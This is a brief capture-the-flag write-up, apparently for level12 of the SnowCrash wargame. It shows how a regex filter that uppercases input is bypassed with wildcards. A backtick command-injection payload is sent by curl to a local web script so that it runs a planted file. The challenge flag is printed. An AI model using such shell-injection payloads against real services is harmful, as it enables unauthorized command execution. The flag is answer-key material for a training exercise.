firstly we cried a lot when we saw that it was a regex
Secondly when we cat the file we saw that egrep was inside ``
So the idea was to execute a subshell inside the egrep.
What we did was :
echo 'getflag > /var/crash/flag' > /var/crash/123
make it executable :
level12@SnowCrash:~$ chmod 777 /var/crash/123
To be working we need flag to
Then we encoded the string `/*/*/123`
Because of the regex we had to put * instead of the repo bc the regex
put everything on maj.

And we execute this: curl http://127.0.0.1:4646/?x=%60%2F%2A%2F%2A%2F123%60&y=y
flag = g1qKMiRpXf53AWhDaU7FEkczr
